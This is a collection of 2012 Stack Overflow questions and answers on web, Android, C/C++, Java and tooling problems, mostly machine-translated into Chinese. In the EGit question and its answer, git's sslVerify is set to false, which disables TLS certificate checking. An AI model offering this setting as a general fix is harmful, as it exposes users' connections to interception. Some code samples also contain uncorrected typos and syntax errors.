    $sqlServer = new-object ("Microsoft.SqlServer.Management.Smo.Server") $server
    $jobServer = $sqlServer.JobServer;
    $jobServer.ReadErrorLog() | 
    where { ($_.ErrorLevel -lt 3) -and ($_.LogDate -ge $(Get-Date).AddDays($EventLogDaysToReview))  } |
    Format-Table -AutoSize -wrap 
```

# javascript - 如果窗口大小发生变化，将 div 移动到固定位置

> ID：13957249
> 
> 赞同：3
> 
> 时间：2012-12-19T16:54:02.260
> 
> 标签：javascript, html, css, markup

我该如何执行以下操作：当页面在窄屏幕上打开或浏览器窗口大小发生更改时，我需要一个 div 来更改其位置。当页面向上或向下滚动时，固定的 div 应该保持在相同的垂直位置，但我还需要它距离最大的 div 10px（较小的 div 的容器，请参见图片）。现在，当我调整窗口大小时，固定 div 会超过右侧的 div。

所以问题是我怎样才能让这个固定的 div 在垂直滚动页面时保持在相同的位置，并使其始终与右侧 div 保持 10px 的距离？固定的CSS类是：

```
.fixed{
    width:40px;
    height:40px;
    position:fixed;
    bottom:100px;
    left:100px;
    text-indent:-9999px;
} 
```

事实上，我正在尝试实现一个“返回顶部”按钮，所以固定的 div 是这个按钮，最大的 div 是页面的内容。

这是我现在拥有的：

![在此处输入图像描述](../Images/2e0f7d999101f7602f8265fe6130a5b4.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:35:27.423

更改您的 CSS 使其看起来像这样：

```
.fixed{
    width:40px;
    height:40px;
    position:fixed;
    bottom:100px;
    left:50%;
    margin-left: -[(maincontainerwidth/2) + 50];
    text-indent:-9999px;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T17:13:52.727

我会这样做的两种方法：

1) 读取窗口宽度并更改您的 css 的自定义 javascript

2) 或者使用像 adapt.js 这样的库来检测和交换 .css

关键词：[响应式网页设计](http://en.wikipedia.org/wiki/Responsive_web_design)

看看[adapt.js](http://adapt.960.gs/) ，它是一个 javascript 库，可以根据页面窗口大小加载不同的 css 文件。如果您想在移动设备和桌面屏幕之间显示不同的内容，这种技术非常有用。

在您的情况下，这也可能有效。

**1）参考adapter.js**

```
<script src="/js/adapt.js" type="text/javascript></script> 
```

**2) 配置**

所以基本上你会有两种观点：

```
// Edit to suit your needs.
var ADAPT_CONFIG = {
  // Where is your CSS?
  path: 'assets/css/',

  // false = Only run once, when page first loads.
  // true = Change on window resize and page tilt.
  dynamic: true,

  // Optional callback... myCallback(i, width)
  callback: myCallback,

  // First range entry is the minimum.
  // Last range entry is the maximum.
  // Separate ranges by "to" keyword.
  range: [
    '0px    to 760px  = Narrow.css', // css for narrow views
    '760px  to 980px  = Narrow.css',
    '980px  to 1280px = Wide.css', // css for wide views
    '1280px to 1600px = Wide.css',
    '1600px to 1920px = Wide.css',
    '1940px to 2540px = Wide.css',
    '2540px           = Wide.css'
  ]
}; 
```

**3）总共看起来像**

```
<html>
    <head>
    ...

    <script src="/js/adapt.js" type="text/javascript></script>
    <script type="text/javascript>
        // Edit to suit your needs.
        var ADAPT_CONFIG = {
          // Where is your CSS?
          path: 'assets/css/',

          // false = Only run once, when page first loads.
          // true = Change on window resize and page tilt.
          dynamic: true,

          // Optional callback... myCallback(i, width)
          callback: myCallback,

          // First range entry is the minimum.
          // Last range entry is the maximum.
          // Separate ranges by "to" keyword.
          range: [
            '0px    to 760px  = Narrow.css', // css for narrow views
            '760px  to 980px  = Narrow.css',
            '980px  to 1280px = Wide.css', // css for wide views
            '1280px to 1600px = Wide.css',
            '1600px to 1920px = Wide.css',
            '1940px to 2540px = Wide.css',
            '2540px           = Wide.css'
          ]
        };
    </script>
    ...
    </head>
    <body>
            ...
    </body>
</html> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:09:37.073

### 包装！

我想控制它的最好方法是使用 wrapper `div`。所以，有这样的事情：

```
<div class="wrap">
    <!-- Contents -->
    <div class="fixed">
    </div>
</div> 
```

### 现在添加 CSS：

```
.wrap {width: [fixed width]; position: relative;}
.fixed {left: -100px;} 
```

我觉得包装器`div`是不必要的，因为它`body`本身是`relative`ly `position`ed。使用这种方法，它们`div`保持在相同的位置。

# android - 无法将 PopupWindow 背景设置为透明

> ID：13957250
> 
> 赞同：10
> 
> 时间：2012-12-19T16:54:05.237
> 
> 标签：android, background, android-mapview, transparent

我有以下代码：

```
View child = getLayoutInflater().inflate(R.layout.contextual_menu_lp_activity, null)   
child.setBackgroundColor(getResources().getColor(R.color.transparent));
child.setBackgroundDrawable(new BitmapDrawable());
popup = new PopupWindow(MapViewActivity.this);
popup.setContentView(child);
popup.showAtLocation(MapViewActivity.mapView, Gravity.CENTER, 10,10);                           
popup.setBackgroundDrawable(new BitmapDrawable());                          
child.measure(View.MeasureSpec.UNSPECIFIED, View.MeasureSpec.UNSPECIFIED);
                    popup.update(50, 50,child.getMeasuredWidth(), child.getMeasuredHeight()); 
```

如您所见，我设置了视图，并拼命尝试使其背景透明。

在 xml 布局上，所有相对布局都被赋予了透明的颜色背景。

这是xml：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout
xmlns:android="http://schemas.android.com/apk/res/android"    
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical"
android:background="@color/transparent" >

<RelativeLayout
    android:id="@+id/ivDialogPopup"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_centerInParent="true"
    android:paddingBottom="40dp"
    android:background="@drawable/new_pop_up_bk" >

<Button
    android:id="@+id/btLivePolice"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_toLeftOf="@+id/btSaveParkingLocation"
    android:layout_marginRight="4dp"
    android:layout_marginTop="8dp"
    android:background="@drawable/live_police_button_popup" />

<Button
    android:id="@+id/btSaveParkingLocation"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentTop="true"
    android:layout_marginTop="8dp"
    android:layout_centerHorizontal="true"
    android:background="@drawable/parking_location_button" />

<Button
    android:id="@+id/btGetDirections"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_marginLeft="4dp"
    android:layout_marginTop="8dp"
    android:layout_toRightOf="@+id/btSaveParkingLocation"
    android:background="@drawable/directions_button" /> 
```

尽管如此，视图的父布局（相对布局）仍然具有灰色背景。（以前，我使用的是普通活动类，并且在清单中我有一个透明主题 - 其中最重要的部分是将这个 android:windowBackground 设置为透明 - 我必须出于不同的原因对其进行更改）。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2015-02-02T11:11:43.843

您还可以像下面这样设置背景透明。这对我有用。

```
popup.setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT)); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-03-19T02:52:29.560

您所做的是创建一个透明的 png（例如 clear.png）文件并将其放在您的 drawables 文件夹中，然后调用

```
yourPopUp.setBackgroundDrawable(getResources().getDrawable(R.drawable.clear)); 
```

这样，弹出窗口仍然可以关闭，如果您尝试使用 null，则情况并非如此。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-23T15:04:59.477

使用 android:background="@null"

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T17:56:01.617

尝试使用`@android:style/Theme.Translucent`for your`RelativeLayout`而不是更改`background`颜色。

[这里有一些其他的建议。](https://stackoverflow.com/questions/9663916/how-to-make-a-transparent-layout)

# sublimetext2 - 如何在 Sublime text 2 中为每种文件类型设置标签大小？

> ID：13957252
> 
> 赞同：25
> 
> 时间：2012-12-19T16:54:04.690
> 
> 标签：sublimetext2

例如，在 *.asm 文件中，我需要一个等于 20 个空格的制表符大小，而在 *.cpp 文件中 - 2 个空格。

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2012-12-19T17:37:59.467

`.asm`在 Sublime Text 中打开一个文件。

然后使用 menu 编辑语法特定设置`Preferences -> Settings - More -> Syntax Specific - User`：

```
{
    "tab_size": 20
} 
```

您可以对任何其他文件类型执行相同操作。

# c++ - c/c++ - 通过套接字发送 time_t 的最安全方法

> ID：13957254
> 
> 赞同：10
> 
> 时间：2012-12-19T16:54:25.900
> 
> 标签：c++, c, time, network-programming

我已经建立了一个 C++ 服务器/客户端环境，并试图将 time_t 值从服务器发送到客户端（在任何服务器中都是有用的东西）。但我遇到了一个头疼的问题：time_t 似乎没有任何尺寸规格。我想知道通过网络发送 time_t 的最安全（更便携）的方式是什么。

这是一个小例子：

```
time_t T = time(NULL);
unsigned char * P = (unsigned char *)&T;
// ... Convert it to network byte order, etc.

// Here, 's' would be the socket, and 'S'
// the size of the data that is going to
// be sent
send(s, P, S, 0); 
```

我有两个问题：

*   time_t 不是大小固定的
*   time_t 可以是有符号或无符号整数数据类型的 typedef

我该如何处理这两个问题，以便我可以在（几乎）任何架构之间安全地发送它？

提前致谢。

编辑：看到相同的三个答案后，我发现在这里回复更好。很抱歉我之前没有澄清这一点。我更喜欢以“纯”字节发送它，尽管将它作为字符串发送不是问题。据我了解，我需要（再次）记住主机系统中 time_t 数据类型的签名和大小，不是吗？（谢谢和抱歉）

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-19T17:00:25.033

First, I think you need to decide if you want to deal with the issue that the C standard leaves the meaning of `time_t` overly vague (it's not necessarily represented in seconds and doesn't even have any meaningful numerical properties like order/comparison). This is contrary to the behavior of **every** existing and historical implementation, where `time_t` is in seconds. Both C and POSIX also allow `time_t` to be a floating point type; as far as I know, no implementations make use of this, and on POSIX it would be rather harmful since the *value* of `time_t` has to be an integer the way it's used in `struct timespec`, etc.

If you decide you're happy assuming `time_t` is always an integral number of seconds since the epoch, i.e. the *values* are meaningful for interchange between systems, then it's just a matter of formatting them. The safest thing to do would be to simply cast to a integer type that's large enough to store any meaningful value and that's the same size on all systems: that would be `int64_t`. Then use whatever normal means you use for serializing `int64_t` in a way that's immune to endian differences.

If on the other hand you want to be "absolutely" portable, you should compute your own `time_t` value for "the epoch" (either the standard one or your own choice of epoch), then use `difftime` to convert to a double representing "seconds since the epoch", and format the `double` with `snprintf(buf, sizeof buf, "%.0f", diff)`. Note that computing a `time_t` value for the epoch in portable C is actually quite difficult because most of the standard functions work in local time, whereas you need universal time. There are tricks you can do with the `gmtime`, `mktime`, and `localtime` functions to figure it out, but it's nontrivial...

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-19T16:57:41.887

您可以发送[`strftime`](http://en.cppreference.com/w/c/chrono/strftime)与 结合生成的文本表示`gmtime`。该表示会比二进制表示稍大，但不会很大。例如，格式字符串`"%Y%j%H%M%S"`会生成一个 13 字节的时间表示（不包括 NUL 字符）。

**编辑**：忘记我以前的使用建议`ctime`；它使用[`localtime`](http://en.cppreference.com/w/c/chrono/localtime)并因此仅在客户端和服务器位于同一时区时才有效。显然，`asctime`是不安全的，所以使用`strftime`.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-19T16:58:28.650

您可以使用固定位数的文本形式发送它。这样您就不必担心符号、大小不兼容，甚至字节顺序。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-03-13T21:00:46.717

**更新：**似乎有一个库可以提供您正在寻找的内容，请查看[Apache Portable Runtime](http://apr.apache.org/)，特别[是有关时间例程的此页面](https://apr.apache.org/docs/apr/1.5/group__apr__time.html)。除此之外，我会说我的答案仍然提供了一种手动实现此功能的方法，前提是所有系统都符合 POSIX.1-2001。

我现在遇到了类似的问题，我认为有一些关于如何解决这个问题的说明可能会很好。请注意，这里的解决方案应该与 POSIX.1-2001 兼容（在 Ubuntu 14.04 上，`man tzset`并`man localtime`提供此类信息，并且我没有使用其他来源，真的）。

用于`localtime`将从您的调用中获得的数据转换`time`为`struct tm`（参见 参考资料`time.h`）：

```
struct tm {
           int tm_sec;         /* seconds */
           int tm_min;         /* minutes */
           int tm_hour;        /* hours */
           int tm_mday;        /* day of the month */
           int tm_mon;         /* month */
           int tm_year;        /* year */
           int tm_wday;        /* day of the week */
           int tm_yday;        /* day in the year */
           int tm_isdst;       /* daylight saving time */
}; 
```

请注意，`localtime`将声明的变量设置为（再次，请参阅`time.h`）

```
extern long timezone; //seconds West of UTC 
```

由于现在所有类型都是已知的，因此您可以编写自己的转换工具来使该数据在网络上可移植。需要考虑的事项：

*   （最好在您的软件初始化中），您必须确定您拥有多少字节（当然`int`，使用）`long``sizeof`
*   根据该信息，您可以对`struct tm`（使用`htonl`或`htons`- 对于 64 位类型，您必须自己编写）的每个整数字段进行主机到网络转换并将该信息发送到客户端（以您喜欢的任何方式）。
    *如果您有时区差异，*您还需要转换/发送时区信息，即存储在变量中的数据`timezone`（见上文）。
*   然后客户必须

    1.  将接收到的数据转换成客户端字节序
    2.  写入a `struct tm`（如果涉及时区，将接收到的时区数据写入a `long`）
    3.  *如果涉及时区*，将接收到的时区数据写入a`long`并计算时区差异（计算接收到的数据与本地`timezone`调用得到的差异......），然后调整在步骤2中创建的变量。`tzset``struct tm`
    4.  获得`struct tm`调整到客户端本地时区的一个，用于`mktime`将数据转换回一个`time_t`
    5.  考虑时区差异，如果有的话。

# webmethods - WebMethods：如何从集成服务器 Java 服务调用 My Webmethods Server 业务日历？

> ID：13957261
> 
> 赞同：2
> 
> 时间：2012-12-19T16:54:46.363
> 
> 标签：webmethods

简而言之，我正在尝试做的事情：我正在尝试从我尝试编写的 Java 服务访问使用 My Webmethods Server 中的管理员登录创建的公司日历。该服务将获取日历（包含工作日、节假日和其他休息时间）并调用另一个服务，该服务将占用任务“活动”（自创建以来）的总天数，并减去非工作日，得出总工作日任务已经“活着”。

com.webmethods.sc.calendar 下有一个包，它确实有一个类 ICalendarManager.class，它有一个方法：getCalendarByID() 但我不相信这是我需要的。

我的过程的第一步：获取公司日历......我对 webmethods 相当陌生，甚至完全不知道从哪里开始，请指出正确的方向！

# jquery - 将图像裁剪为相同的高度和宽度？

> ID：13957262
> 
> 赞同：1
> 
> 时间：2012-12-19T16:54:48.247
> 
> 标签：jquery, image-resizing

我说的是[500px.com 之](http://500px.com/popular)类的东西。每张图片的高度和宽度都相同，这样布局时看起来很棒。我一直在寻找一点，似乎无法找到实现这一目标的教程。我确实知道如何简单地调整图像大小，但我正在寻找这样的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T18:46:01.627

与其在客户端进行图像大小调整/裁剪，不如尝试使用一组服务器端实用程序。

假设你在你的服务器上运行 PHP 并且可以安装 ImageMagik（如果还没有的话）

看看[觉王的“Opticrop”库](http://jueseph.com/2010/06/opticrop-usage-and-implementation/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:01:01.077

这取决于。如果源图像已经具有统一的高度和宽度，那么在保持纵横比的同时调整它们的大小很简单，尽管增加大小最终会导致失真。

但是，如果它们具有不同的高度/宽度，您将通过将它们强制为统一大小来扭曲。您可能需要裁剪边缘松散的部分。最好的方法可能是找到图像的中心，然后从那里计算出你想要的宽度和高度。

获得该图像后，您可以向上或向下调整大小。

不过，在服务器端代码中执行此操作可能更快/更有效。

# sql - 嵌套存储过程中的 SQL 变量

> ID：13957269
> 
> 赞同：4
> 
> 时间：2012-12-19T16:55:19.163
> 
> 标签：sql, sql-server

我创建了一个存储过程，它从表中的特定列中检索最后一个值，并根据文档类型和位置将其递增一。

当我单独调用此存储过程时，它可以完美运行。但是当我将它嵌套在另一个存储过程中时，该值未设置为 variable `@TempLastGeneratedNumber`。当我在另一个过程中调用存储过程并且如果我打印`@TempLastGeneratedNumber`它的值是空的。

但是当我单独调用存储过程时，我得到了正确的值。

这是我的存储过程

```
 Create Procedure [GenerateDocumentNo]
        @Document_Type varchar(max) = null,
        @Location_Id int = null
        @FinalNumber varchar(max) = null output
    as
    begin try
    begin tran

    Declare @TempLastGeneratedNumber varchar(max)

    if (@Document_Type = 'Apple')
    BEGIN
    Select top(1) @TempLastGeneratedNumber = Code from Apple_Details_tbl where Location_Id = @Location_Id  order by Id desc
    END

    else if (@Document_Type = 'Mango')
    BEGIN
    Select top(1) @TempLastGeneratedNumber = Code from Mango_Details_tbl where Location_Id = @Location_Id order by Id desc
    END

    if(@TempLastGeneratedNumber is not null or @TempLastGeneratedNumber != '')
    BEGIN

    Set @FinalNumber = @TempLastGeneratedNumber + 1
    END

    commit tran
    end try

    begin catch
    PRINT ERROR_MESSAGE()
    if
    end catch 
```

所以请帮助我上面存储过程中的问题是什么以及如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:20:52.183

该值很可能是 NULL，因为查询没有返回任何值或返回 NULL 值。

据推测，这是因为@Document_Type 既不是“Apple”也不是“Mango”。或者，因为 location_id 不在表中。或者，因为`code`最大 id 为 NULL。

在调用过程时尝试打印出参数的值。

另一种可能性是您没有在调用和定义中将 @FinalNumber 声明为输出参数。

我确实认为将变量命名为“whatever NUMBER”之类的名称然后使其类型为非数字是不好的做法。但是，我不认为这会导致您的问题。

# javascript - 使用 JavaScript 更改行表颜色

> ID：13957276
> 
> 赞同：2
> 
> 时间：2012-12-19T16:55:37.243
> 
> 标签：javascript, jquery, css, background, html-table

我尝试使用 JavaScript 更改表中行的背景，但它不起作用。这是我的[代码](http://jsfiddle.net/Mils/e2rYy/9/)。但是，我尝试使用 html 及其工作创建一个表。PS：我想使用 webkit。

代码 ：

```
var table = document.getElementById("tab");
var rowCount = table.rows.length;

for(var i=0;i<6;i++) {     
   row = table.insertRow(rowCount);
   row.id = "row"+i;
   cell1 = row.insertCell(0);
   var content = document.createElement("output");                
   content.innerHTML = i ;
   cell1.appendChild(content);
   rowCount++;
}

 $(document).ready(function(){
        $('td').each(function(i) {     
             $('#tab').on('click', '#row'+i, function(){
                document.getElementById("row"+i).style.background = 'white';
                 //alert(i);
             });   
        });   

     //example2
     $('#td1').on('click', function(){
                document.getElementById("td1").style.background = 'white';
             });   
 }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:02:13.827

您遇到的问题是因为您在 上设置背景渐变`TD`，然后在`TR`. 由于 TD 在 TR 内，您只是看不到您的更改被应用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T17:06:50.083

您不应该在循环中分配事件处理程序，尤其是当您不需要时：

```
$('#tab').on('click', 'tr', function () {
    $('td,th', this).css('background', 'white');
}); 
```

[小提琴](http://jsfiddle.net/e2rYy/19/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-19T16:58:59.867

它是背景颜色，而不是背景。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-19T17:06:09.727

第一个问题是**关闭问题**......

Click 事件将始终指向**i 的最后一个实例。**

将您的代码更改为此

```
$('td').each(function(i) {
     (function(num) {
        $('#tab').on('click', '#row' + num, function() {
           document.getElementById("row" + num).style.background = '';
          //alert(i);
        });
     })(i)
 }); 
```

这可能不是非功能代码的主要原因..

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-19T17:10:41.560

你想改变整行或当前单元格的颜色吗？您当前的选择器仅适用于特定单元格。

```
// for the complete row
$(document).ready(function(){
    $('td').on('click',function(){
        $(this).closest('tr').find('td').css({'background':'red'});
    });
}); 

// or for the active cell..
$(document).ready(function(){
    $('td').on('click',function(){
        $(this).css({'background':'red'});
    });
}); 
```

有关行解决方案，请参阅此小提琴[http://jsfiddle.net/axelmichel/2KUCz/](http://jsfiddle.net/axelmichel/2KUCz/)。如果您希望每个表具有不同的行为，您可以修改选择器：

```
$('#tab').find.('td').on('click',... 
```

# php - beforeSave 未在关联行上调用

> ID：13957277
> 
> 赞同：0
> 
> 时间：2012-12-19T16:55:37.063
> 
> 标签：php, cakephp-2.0, has-many, before-save

当所有者对象调用关联的行以执行 beforeSave 函数时，我一直遇到问题。对于这个例子，我在 Asset hasMany Versions 中使用了 Asset 和 AssetVersion。

我的意图是在 AssetVersion 模型中使用 beforeSave 通过 find 找到当前最高版本号，然后将其放入数据库中。我当然不能在控制器中使用 saveAssociated 并捕获asset_id 然后在 AssetVersion 模型上调用 save 但这感觉不是正确的方法。beforeSave 在 Asset 而不是 AssetVersion 中被调用。

```
class AssetsController extends AppController
{
    public function add()
    {
        if (!$this->request->is('post'))
            return false;

        $md5 = md5(microtime(true));

        $data['Versions'] = array(
            array(
                'md5' => $md5,
            )
        );
        debug($data);

        $this->Asset->create();
        if ($this->Asset->saveAll($data))
        {
            die('boom');
            $this->Session->setFlash(__('The asset has been saved'));
            $this->redirect(array('action' => 'index'));
        } else {
            $this->Session->setFlash(__('The asset could not be saved. Please, try again.'));
        }
    }
}

class Asset extends AppModel
{   
    public $hasMany = array(
        'Versions' => array(
            'className' => 'AssetVersions'
        )
    );

    public function beforeSave($options = array())
    {   
        if(!isset($this->data['Asset']['created_id']))
            $this->data['Asset']['created_id'] = CakeSession::read('Auth.User.id');

        $this->data['Asset']['updated_by'] = CakeSession::read('Auth.User.id');
        return parent::beforeSave();
    }

}

class AssetVersion extends AppModel
{
    public $belongsTo = array(
        'Asset'
    );

    public function beforeSave($options = array())
    {
        debug('I dont get called at all');
        debug($this->data);
        die();
    }
} 
```

知道我做错了什么吗？我一直在尝试调试在 CakePHP 本身中调用的内容，并且到目前为止已经证明当保存关联数据时会分派一个事件，但我在 AssetVersion 中根本看不到我的调试。

# javascript - 如何将负载处理程序附加到动态创建的项目

> ID：13957279
> 
> 赞同：0
> 
> 时间：2012-12-19T16:55:40.007
> 
> 标签：javascript, jquery, events

我正在尝试将负载处理程序绑定到动态创建的对象（我的生产代码中的主干视图）。我尝试使用[在 jQuery 中概述的方法，如何将事件附加到动态 html 元素？](https://stackoverflow.com/questions/1359018/in-jquery-how-to-attach-events-to-dynamic-html-elements#_=_), 它适用于点击处理程序，但不适用于负载处理程序。有谁知道如何解决这个问题？

这有效（使用点击处理程序）

```
 $(document).ready(function() {
    $("body").on("click", "img", function(){
      console.log("foo");
    });

    create();
  });

  function create(){
    $img = $("<img />").attr("src", "http://www.pureweber.com/wp-content/uploads/2011/04/jquery_icon.png");
    $("body").append($img);
  } 
```

但这不是（使用负载处理程序）

```
 $(document).ready(function() {
    $("body").on("load", "img", function(){
      console.log("foo");
    });

    create();
  });

  function create(){
    $img = $("<img />").attr("src", "http://www.pureweber.com/wp-content/uploads/2011/04/jquery_icon.png");
    $("body").append($img);
  } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T16:58:06.480

不幸的是，使用子`on`选择器仅适用于冒泡的事件类型。DOM`load`事件不会在树中冒泡，因此它永远不会到达`body`您正在侦听它的位置。

请参阅[http://en.wikipedia.org/wiki/DOM_events](http://en.wikipedia.org/wiki/DOM_events)

您需要手动将处理程序附加到您创建的任何图像。

```
$(document).ready(function() {
  $("body img").on("load" onLoad);

  create();
});

functon onLoad(){
    console.log("foo");
}

function create(){
  $("<img />")
    .on('load', onLoad)
    .attr("src", "http://www.pureweber.com/wp-content/uploads/2011/04/jquery_icon.png")
    .appendTo('body');
} 
```

# java - 输出说明

> ID：13957286
> 
> 赞同：1
> 
> 时间：2012-12-19T16:56:11.903
> 
> 标签：java, output

我的程序

```
class Building {
Building() {
    System.out.print("b ");
}

Building(String name) {
    this();
    System.out.print("bn " + name);
}
};

public class House extends Building {
House() {
    System.out.print("h "); // this is line# 1
}

House(String name) {
    this(); // This is line#2
    System.out.print("hn " + name);
}

public static void main(String[] args) {
    new House("x ");
}
} 
```

我们知道编译器会`super()`在子类的构造函数的第一行写一个调用。因此输出不应该是：

`b`（从编译器调用 super()，在第 2 行之前

`b`（再次从编译器对 super() 的书面调用，在第 1 行之前）

```
h hn x 
```

但输出是

```
b h hn x 
```

这是为什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T16:58:45.890

当构造函数以调用另一个构造函数（`this`或`super`）开始时，编译器不会插入对超类的默认构造函数的调用。因此，调用树是：

```
main
 \-> House(String)                (explicit call)
      |-> House()                 (explicit call)
      |    |-> Building()         (implicit call)
      |    |    |-> Object()      (implicit call)
      |    |    \-> print "b "
      |    \-> print "h "
      \-> print "hn x" 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-19T17:01:31.223

根据[JLS 8.8.7](http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.8.6)

> 如果构造函数体**不是以显式构造函数** 调用开始并且被声明的构造函数不是原始类 Object 的一部分，则构造函数体隐式以超类构造函数调用“super();”开始

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-19T17:00:46.737

您的`House(string name)`构造函数调用`House()`，而后者又调用`Building()`. `Building(string name)`永远不会被调用。

如果你想显式调用`Building(string name)`，在你的`House(string name)`构造函数中你可以添加这个：`super(name);`而不是`this();`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-19T17:01:54.260

这是您的代码的可视化控制流程：

```
new House("x ")---> House(args)---> House() --->Building()--->Object()
                               ^^this()    ^implicit      ^implicit super() call 
                                             super()
                                             call 
```

**---> 代表调用**

**输出：** `b(from building no-args), h(from no-args House), hn x (from args House)` bh hn x

> 据我所知，对 super 的隐式调用应该在 this() 之前，对吧？第 2 行，在我的代码中

**编辑：**

构造函数中的第一行是使用 super() 调用超类构造函数或使用 this() 调用重载构造函数。如果使用 this() 调用重载构造函数，则不会调用 super()。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-19T17:02:36.180

```
House(x) -> House() + "hn" + "x"
            Building() + "h" + "hn" +"x"
            "b" + "h" + "hn" + "x" 
```

对超类的调用只会被调用一次。

如果你想`Building(string name)`被调用，你必须明确地调用它。

我认为您使用它可能更容易，`super()`而不是`this()`

# eclipse - 使用自签名证书通过 https 从 egit 连接到 github 企业

> ID：13957294
> 
> 赞同：2
> 
> 时间：2012-12-19T16:56:33.070
> 
> 标签：eclipse, git, https, egit, github-enterprise

我正在尝试通过来自 egit 的 https 从 github 企业服务器克隆一个 git repo，但我收到以下错误：

```
 https://myServer/myOrg/myRepo.git: cannot open git-upload-pack:
  https://myServer/myOrg/myRepo.git: cannot open git-upload-pack 
```

我尝试将以下内容添加到我的 .gitconfig 中，但我遇到了同样的错误。

```
[http]
sslVerify = false 
```

我可以使用 msysgit 从我的 github 企业服务器克隆一个 repo，没有任何问题。我还可以使用 egit 或 msysgit 在 github 上成功克隆一个 repo。我正在使用 EGit 的 2.1.0 版本。我们的 git 服务器不在代理后面，它使用基本身份验证。

知道为什么我不能从 egit 克隆。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-24T23:08:34.913

通过设置以下为我工作

```
[http]
sslVerify = false 
```

请确保使用您正在修改的正确 .gitconfig 文件配置 eclipse

转到窗口 -> 首选项 -> 团队 -> Git -> 配置

“位置”选项必须指向正确的 .gitconfig 文件，例如 H:\.gitconfig

如果你不想直接编辑 .gitconfig 文件，你可以配置如下

窗口 -> 首选项 -> 团队 -> Git -> 配置 -> 新条目 -> http.sslverify=false

# javascript - Javascript在保存时缩小

> ID：13957301
> 
> 赞同：0
> 
> 时间：2012-12-19T16:56:52.667
> 
> 标签：javascript, emacs, minify

我想添加功能，`javascript-mode`以便每当我在当前缓冲区上保存 Javascript 文件时，它都会在使用相对路径（例如`../foo`具有相同文件名）定义的目录中创建它的缩小文件。我怎样才能做到这一点？

我正在使用 Ubuntu 作为操作系统。我应该在emacs中调用一个好的程序来执行此操作吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:13:11.620

您可以向 . 添加函数`after-save-hook`，但使其特定于 javascript 模式，在`js-mode-hook`. 此外，将`add-hook`的第四个参数`LOCAL`设置为非零值。例如：

```
(add-hook 'js-mode-hook
          (lambda () 
            (add-hook 'after-save-hook 'my-minify-function nil t)))

(defun my-minify-function ()
  (shell-command (format "minify %s ../foo/%s" 
                         (buffer-file-name) 
                         (buffer-file-name)))) 
```

# node.js - nodejs grunt 子进程回调函数示例

> ID：13957303
> 
> 赞同：5
> 
> 时间：2012-12-19T16:57:01.777
> 
> 标签：node.js, callback, gruntjs, child-process

你能帮忙看看下面这个用 grunt 运行的 node exec 命令的例子吗？

该`echo`命令正在执行并`hello-world.txt`已创建，但`grunt.log.writeln`回调函数中的命令未触发。

```
var exec = require('child_process').exec,
    child;

    child = exec('echo hello, world! > hello-world.txt', 
        function(error, stdout, stderr){
            grunt.log.writeln('stdout: ' + stdout);
            grunt.log.writeln('stderr: ' + stderr);
            if (error !== null) {
                grunt.log.writeln('exec error: ' + error);
          }
        }
    ); 
```

参考：

[http://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options](http://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options)

[从节点子进程中检索值](https://stackoverflow.com/questions/6712291/retrieving-a-value-from-a-node-child-process)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-19T20:31:37.090

哦！这在常见问题解答中。

将 Gruntjs 用于异步任务时，必须手动指定任务何时完成。 [https://github.com/gruntjs/grunt/wiki/Frequently-Asked-Questions](https://github.com/gruntjs/grunt/wiki/Frequently-Asked-Questions)
[https://github.com/robdodson/async-grunt-tasks](https://github.com/robdodson/async-grunt-tasks)
[https://github.com/rwldrn/dmv/blob/master/ node_modules/grunt/docs/api_task.md](https://github.com/rwldrn/dmv/blob/master/node_modules/grunt/docs/api_task.md)

对于后代，上述内容应如下所示：

```
var exec = require('child_process').exec,
    child,
    done = grunt.task.current.async(); // Tells Grunt that an async task is complete

child = exec('echo hello, world! > hello-world.txt', 
    function(error, stdout, stderr){
        grunt.log.writeln('stdout: ' + stdout);
        grunt.log.writeln('stderr: ' + stderr);
        done(error); // Technique recommended on #grunt IRC channel. Tell Grunt asych function is finished. Pass error for logging; if operation completes successfully error will be null

      }
    }
); 
```

# ios - 如何使用 AVAssetWriter 保留视频的纵横比

> ID：13957305
> 
> 赞同：4
> 
